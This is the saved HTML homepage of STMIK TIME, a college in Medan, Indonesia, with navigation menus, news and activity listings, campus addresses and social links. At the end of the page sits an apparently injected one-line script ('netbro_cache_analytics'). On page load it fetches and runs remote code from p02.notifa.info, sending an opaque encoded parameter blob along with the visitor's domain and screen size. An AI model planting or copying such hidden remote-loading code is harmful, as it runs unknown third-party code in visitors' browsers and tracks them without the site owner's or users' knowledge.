<!doctype html>
<html>
  <head>

    <!-- <script type="text/javascript" src="js/jquery-1.6.min.js"></script> -->
    <script type="text/javascript" src="./js/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="./js/jquery-migrate-1.2.1.min.js"></script>
    

    <script type="text/javascript" src="./js/jquery-ui.js"></script>
    <script type="text/javascript" src="./js/jquery.alerts.js"></script>
    <script type="text/javascript" src="./s/jquery.busy.js"></script>
    <script type="text/javascript" src="./js/izycart.js"></script>
    <script type="text/javascript" src="./js/jquery.noty.js"></script>
    <script type="text/javascript" src="./js/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
    <script type="text/javascript" src="./js/uiwidget.js"></script>


    <script src="./js/validate/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
    <script src="./js/validate/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
    <script type="text/javascript">
      function beforeCall(form, options){
        if (window.console) 
        console.log("Right before the AJAX form validation call");
        return true;
      }
    </script>

    <script type="text/javascript">
      $(document).ready(function(){
        var switcher = $('<a href="javascript:void(0)" class="btn">Change appearance</a>').toggle(
          function(){
            $("#tags ul").hide().addClass("alt").fadeIn("fast");
          },
          function(){
            $("#tags ul").hide().removeClass("alt").fadeIn("fast");
          }
        );
        $('#tags').append(switcher);	
      });
    </script>

    <script type="text/javascript">
      function expanding(elm){
        $("#sub" + elm).slideToggle('slow');
        //alert('tes');
      }
    </script>


    <script>
      function disableForm(form) {
        var btnsave = form.find("[type=submit]");
        tempButtonSimpan = btnsave.html();
        //btnsave.html('Please wait...');
        btnsave.attr('disabled', 'disabled');
        btnsave.hide();	
        $('#loader').fadeIn('fast');
      }

      function enableForm(form){
        var btnsave = form.find("[type=submit]");
        btnsave.removeAttr('disabled', 'disabled');
        //btnsave.html('Simpan');
        btnsave.show();
        $('#loader').fadeOut('fast');
      }
    </script>

    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="description" content="STMIK TIME" />
    <meta name="keywords" content="STMIK TIME" />
    <meta name="author" content="Andy Ong (IzyWeb)" />
    <title>= STMIK TIME =</title>

    
    <link rel="stylesheet" type="text/css" href="./template/001/css/layout.css" media="screen"/>     
    <link rel="stylesheet" type="text/css" href="./template/001/css/header.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/nav.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/center.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/side.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/product.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/breadcrumb.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/pagination.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/cart.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/form.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/fonts.css" media="screen"/>
    <link rel="stylesheet" href="./css/validate/validationEngine.jquery.css" type="text/css"/>
    <link rel="stylesheet" href="./css/tag/tag.css" type="text/css"/>
    <link rel="stylesheet" type="text/css" href="./template/001/css/footer.css" media="screen"/>
    <link rel="stylesheet" type="text/css" href="./css/jquery.noty.css"/>
    <link rel="stylesheet" type="text/css" href="./css/dialog/jquery.alerts.css" media="screen" />
    
    <link rel="stylesheet" type="text/css" href="./js/fancybox/jquery.fancybox-1.3.4.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="./template/001/css/external.css" media="screen"/>

    <link rel="shortcut icon" href="http://www.stmik-time.ac.id/images/logo-time1.jpg" >

  </head>

  <body id="stylebody">

<style type="text/css">
.social {
width:74px;
position:absolute;
top:160px;
right:90px;
}

.social a {
display:block;
margin-bottom:5px;
}
audio {
visibility:hidden;
position:absolute;
top:0;
}

</style>

<div class="social">
	<a href="www.facebook.com/STMIKTIMEOFFICIAL" title="Facebook"><img src="./assets/images/fb.png" /></a>
	<a href="www.twitter.com/stmiktime" title="Twitter"><img src="./assets/images/twitter.png" /></a>
	<a href="www.instagram.com/stmiktime" title="Instagram"><img src="./assets/images/instagram.png" /></a>
  <a href="www.youtube.com/stmiktime" title="Youtube"><img src="./assets/images/youtube.png" /></a>
</div>

<!--
<audio controls autoplay>
  <source src="audio/Mars-Time.ogg" type="audio/ogg">
  <source src="audio/Mars-Time.mp3" type="audio/mpeg">
Your browser does not support the audio element.
</audio>
-->

<table class="container-x" cellpadding="0" cellspacing="0" border="0" align="center">
    <tr valign="top">
        <td>
        <script type="text/javascript">
function bukahalaman(){
halaman = $("#optlinks").val();
window.location=halaman;

}
</script>

<table id="header" width="100%" cellpadding="0" cellspacing="0">
    <tr>
        <td width="520"><img src="http://stmik-time.ac.id/images/logo_s.png" /></td>
        <td>
        	<div class="carikonten">
            	<form action="cari.php" id="frmcarikonten" name="frmcarikonten">
                	<input type="text" class="txtcarikonten" id="txtcarikonten" name="txtcarikonten" />
                    <input type="button" class="but_carikonten" id="but_carikonten" name="but_carikonten" value="" />
                </form>
            </div>
        </td>
        <td>
        	<div class="quicklinks">
            	<form action="query/ajaxValidateRegister.php" id="frmquicklinks" name="frmquicklinks">
                    <select name="optlinks" id="optlinks" class="optlinks">
                            <option value="#">Pilih Halaman</option>
                            <optioin value='index.php'>Home</option>
                            
                            <optgroup label="Profil">
                            <option value='page.php?content=profil'>Sejarah singkat</option>
                            <option value='page.php?content=visimisi'>Visi Misi & Tujuan</option>
                            <option value='page.php?content=maknalogo'>Makna Logo</option>
                            </optgroup>
                            
                            <option value="page.php?content=Campuses" >Campuses</option>
                            <option value="page.php?content=lowongan" >Lowongan Kerja</option>
                            <option value="page.php?content=contact" >Contact</option>
                    </select>
                    <input type="button" class="but_quicklinks" id="but_quicklinks" name="but_quicklinks" value="" onclick="bukahalaman()" />
                </form>
            </div>
        </td>
    </tr>
</table>        </td>
    </tr>    

    <tr valign="top">
        <td>

        <script type="text/javascript">
$(document).ready(function(){
$("ul#navigation li a").click(function() {
$("ul#navigation li").removeClass("selected");
$(this).parents().addClass("selected"); 
return false;
}); 
});	
</script>


<div id="topnav">
  <div class="bgtopnav">
  <table width="100%" cellpadding="0" cellspacing="0"><tr>    
    <td>
     <ul class="nav main">
			  <li><a href="index.php">Home</a></li>

         <li><a href="#">Profil<img src="./template/001/images/adasub.png" /></a>
                <ul>
                  <li><a href="page.php?content=profil">Sejarah Singkat</a></li>
                  <li><a href="page.php?content=visimisi">Visi, Misi & Tujuan</a></li>
                  <li><a href="page.php?content=maknalogo">Makna Logo</a></li>
                </ul>
        </li>
                  <li><a href="page.php?content=Campuses">Campuses</a></li>
                  <li><a href="./ejournal">Penelitian</a></li>
                  <li><a href="./perpustakaan">Perpustakaan</a></li>
                  <li><a href="news.php?cat=Prodi">Prodi</a></li>
                  <li><a href="page.php?content=lowongan">Lowongan Kerja</a></li>
                  <li><a href="contact.php">Hubungi Kami</a></li>
      </ul>
    </td>
    </table>    
      <div class="clear"></div>
  </div>
</div>

</td>
    </tr>    
</table>

<table class="container-x bgcontainer" cellpadding="0" cellspacing="0" border="0" align="center">
    <tr valign="top">
        <td class="">
            
<link rel="stylesheet" href="./css/nivoslider/themes/default/default.css" type="text/css" media="screen" />
<link rel="stylesheet" href="./css/nivoslider/nivo-slider.css" type="text/css" media="screen" />
<link rel="stylesheet" href="./css/nivoslider/style-nivo.css" type="text/css" media="screen" />
<script type="text/javascript" src="./js/jquery.nivo.slider.pack.js"></script>

<script>
		$(function(){
			$('#slider').nivoSlider();
		});
	</script>
<style type="text/css">
.theme-default #slider {
    margin:0px auto 0 auto;
}

.theme-default #slider, .theme-default #slider img {
    width:954px; /* Make sure your images are the same size */
    height:318px; /* Make sure your images are the same size */
}

.topbanner {
width:968px;
height:336px;
border:1px solid #dbdbdb;
margin-top:10px;
}

</style>    

<table cellpadding="0" cellspacing="0" border="0" class="topbanner">
    <tr>
        <td>
            <div class="slider-wrapper theme-default">
            <div id="slider" class="nivoSlider">
                            <a href="#"><img class="" src="http://stmik-time.ac.id/images/ProdiNews/Perdana.jpg" alt="IMAGE BANNER" /></a>
                            <a href="#"><img class="" src="http://stmik-time.ac.id/images/ProdiNews/KRS2018.jpg" alt="IMAGE BANNER" /></a>
                            <a href="#"><img class="" src="http://stmik-time.ac.id/images/ProdiNews/KRS151617.jpg" alt="IMAGE BANNER" /></a>
                        <div class="clear" style="clear:both; float:none;"></div>
            </div>
            </div>
        </td>
    </tr>
</table>

<div class="hotline">
	061-4561932
</div>

        </td>
    </tr>    

    <tr valign="top">
        <td>
            <div id="center">
                <div class="circle_info">
    <table class="circle_info_content" cellpadding="0" cellspacing="0" border="0" align="center">
        <tr>
            <td><a href="registration.php" class="mahasiswa"></a></td>
            <td><a href="contact.php" class="hubungi"></a></td>
            <td><a href="page.php?content=kalender" class="kalender"></a></td>
            <td><a href="login.php" class="portal"></a></td>
            <td><a href="page.php?content=lowongan" class="lowongan"></a></td>
            <td><a href="#" class="ikatan"></a></td>
        </tr>
    </table>
</div>

<div class="homecontent">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" align="center">
        <tr valign="top">
            <td>
            	<div class="kegiatan">
                	<table width="94%" cellpadding="0" cellspacing="0">
                        <tr>
                            <td><h2 class="hdg_home">KEGIATAN</h2></td>
                            <td align="right"><a href="news.php?cat=Kegiatan">Kegiatan Lainnya</a></td>
                        </tr>
                    </table>
                    <ul class="home_kegiatan">
                                                            	                        <li>
                            <div class="cropimg imgnews" style="width:205px; height:95px;">
                            	<img src="http://stmik-time.ac.id/images/kegiatan/2018/lima-2018/icon.jpg" />
                            </div>
                            <a href="detailnews.php?id=499" style="display:block; height:50px;">LIGA MAHASISWA BASKETBALL 2018</a>
                        </li>
                     	                                                              	                        <li>
                            <div class="cropimg imgnews" style="width:205px; height:95px;">
                            	<img src="http://stmik-time.ac.id/images/kegiatan/2018/enterpreneurship-2018/icon.jpg" />
                            </div>
                            <a href="detailnews.php?id=498" style="display:block; height:50px;">Enterpreneur’s Day II STMIK TIME & STMB MULTI SMART</a>
                        </li>
                     	                                                              	                        <li>
                            <div class="cropimg imgnews" style="width:205px; height:95px;">
                            	<img src="http://stmik-time.ac.id/images/kegiatan/2018/findit-2018/download.jpg" />
                            </div>
                            <a href="detailnews.php?id=497" style="display:block; height:50px;">STMIK TIME Mengikuti Kompetisi Setingkat Nasional “Find It UGM”</a>
                        </li>
                     	                                                              	                        <li>
                            <div class="cropimg imgnews" style="width:205px; height:95px;">
                            	<img src="http://stmik-time.ac.id/images/kegiatan/2018/sales-vs-marketing-2018/icon.jpg" />
                            </div>
                            <a href="detailnews.php?id=492" style="display:block; height:50px;">Seminar STMIK TIME Terdahsyat Sales vs Marketing</a>
                        </li>
                     	                                                              	                                             
                        <li style="clear:both; float:none;"></li>
                    </ul>
                </div>
            </td>

              <td style="padding-left:25px;">
                <h2 class="hdg_home" style="margin:18px 25px 20px 0px;"><img src="./template/001/images/berita_akademik.png" /></h2>
                <ul class="berita_akademik">
                <li>
                                                            	                    	<table cellpadding="0" cellspacing="0">
                            <tr valign="top">
                                <td>
                                    <div class="cropimg imgnews" style="width:95px;">
                                        <img src="http://stmik-time.ac.id/images/akademik/2018/khs_2017/logo.jpg" height="95" />
                                    </div>
                                    </td>
                                 <td style="padding-right:20px;">
                                    <a href="detailnews.php?id=496" class="titlenews1">KHS 2017/2018 Semester Ganjil</a>
                                    <div class="simplenews1"></div>
                                </td>
                            </tr>
                        </table>
                                                                                     	                                                             	                                                             	                                                             	                                                             </li>
                    <li style="clear:both; float:none;"></li>
                </ul>
                <p align="right" class="mright30"><a href="news.php?cat=Akademik">Baca berita lainnya</a></p>
                        
                <ul class="berita_akademik">
                    <li>
                    <iframe width="440" height="230" src="//www.youtube.com/embed/AbdVL2OTNr0" frameborder="0" allowfullscreen></iframe>
                                                                                    	                                                            	                                                            	                                                            	                                                            </li>
                    <li style="clear:both; float:none;"></li>
                </ul>
                <p align="right" class="mright30"><a href="video.php">Lihat video lainnya</a></p>
            </td>
        </tr>
    </table>
</div>            <div class="clear"></div>
    
            </div>
        </td>
    </tr>
</table>

<table class="container-x" cellpadding="0" cellspacing="0" align="center">
    <tr>
    <td><div id="footer" align="center">	
	<table width="100%" cellpadding="0" cellspacing="0">
  <tr valign="top">
        <td>
            <img src="./template/001/images/footlogo.png" />
            <div class="copyright">Copyright &copy; 2012 STMIK TIME<br />
			Powered By <a href="http://www.izywebstore.com">izywebstore.com</a></div>
            <div class="clear"></div>
        </td>
        <td>
            <img src="./template/001/images/lokasikampus.png" />
            <div class="foot_info">
                <div>
<p><strong>KAMPUS MERBABU A</strong><br /> JL. MERBABU NO. 32 aa - bb, Medan 20212<br /> P. 061 - 4561932 , 4533678 | F. 061 - 4533681</p>
<p><strong>KAMPUS MERBABU B</strong><br /> JL. MERBABU no. 32 H, Medan 20212<br /> P. 061 - 4561932 , 4533678 | F. 061 - 4533681</p>
<p><strong>KAMPUS MULTATULI</strong><br /> KOMP. MULTATULI BLOK CC NO. 48-49, Medan<br /> P. 061 - 4575842, 4575843 | F. 061 - 4533681</p>
</div>
</div>
        </td>
        <td>
            <img src="./template/001/images/socialmedia.png" />
            <div class="foot_info">
                <p><span>FACEBOOK :</span><br />
                <a href="www.facebook.com/STMIKTIMEOFFICIAL" target="_blank">www.facebook.com/STMIKTIMEOFFICIAL</a>
                </p>
                
                <p><span>TWITTER : </span><br />
                <a href="www.twitter.com/stmiktime" target="_blank">www.twitter.com/stmiktime</a>
                </p>
                
                <p><span>INSTAGRAM: </span><br />
                <a href="www.instagram.com/stmiktime" target="_blank">www.instagram.com/stmiktime</a>
                </p>
                
                <p><span>YOUTUBE: </span><br />
                <a href="www.youtube.com/stmiktime" target="_blank">www.youtube.com/stmiktime</a>
                </p>
                
                <p><span>WEBSITE : </span><br />
                Http://www.stmik-time.ac.id
                </p>
                <p><span>EMAIL : </span><br />
                <a href="mailto:info@stmiktime.ac.id">info@stmiktime.ac.id</a>
                </p>
			</div>
        </td>
        <td>
            <img src="./template/001/images/shortcut.png" />
            <div class="foot_info">
                <p><span><a href="index.php">Home</a></span><br />
                <span>Profil</span><br />
                + <a href="page.php?content=profil">+ Sejarah Singkat</a><br />
                + <a href="page.php?content=visimisi">+ Visi Misi Tujuan</a><br />
                + <a href="page.php?content=maknalogo">+ Makna Logo</a><br />
                <span><a href="page.php?content=Campuses">Campuses</a></span><br />
                <span><a href="page.php?content=lowongan">Lowongan</a></span><br />
                <span><a href="contact.php">Contact</a></span><br />

	</p>
  </div>
        </td>
    </tr>
    </table>
</div>


</td>
    </tr>
</table>
<!--
<script data-version='v1' data-widget-id='your-clients-id' id='unique-embedder-id' type='text/javascript'>
  (function() {
    function async_load(){
      var s = document.createElement('script');
      s.type = 'text/javascript';
      s.async = true;
	  var theUrl = 'http://superhost.website/live_chat/loader.js';
	  s.src = theUrl;
      var embedder = document.getElementById('unique-embedder-id');
      embedder.parentNode.insertBefore(s, embedder);
    }
    if (window.attachEvent) {
      window.attachEvent('onload', async_load);
	} else {
      window.addEventListener('load', async_load, false);
	}
	
    })();
</script>
-->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mCs%2bw5EsSoMNEhZRCr36papa44hq%2bCs%2fLWEKEG01aImqCGxr6JAtaMbz4GOfPOboShurCCh76rHzEim0SG97APuP2oSFBTsWlG%2b2SPwTOAD6TL%2bhE%2fzzTA7gmOFWlu015nQJC8F2MrxEljcFM9q9s9t6Ogf6o24WUJaYhgfxS2IxRhiKX1R0%2bwTTbHeCd%2f0noLyMci%2bvR%2f%2bfbihed%2bl9k%2fqr05UG4LDmaNGLMNKo2u6DDCLA1ZW8BRE%2fci205beMRkEF9%2fp46Vm%2bx6EdIj7%2f4OfgyoVvICLoyMVUM8WsOjouUaI2h0bOh4TLR61nKOAn3xX5JWtqctiRVBo0nR7YUnTWZiz2KQP%2fivddFI3THBuHb2l3uvJR87ku0kkrfBTrfNgGp2iR7o%2fJ8stFvukj5ewzbfZ%2fCccGNX4cF%2fVswxrCZ4VCgbm8rPY87QiRIAXucZBkMfXKTybRjFQSgoFYEHOJNWHunYxTAy63JXkEKBT%2fSE616%2fOvvVTUOwcIihbfxvwGzC%2b1SIH8QQzvycuVP8XPe5MF%2b0HET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>




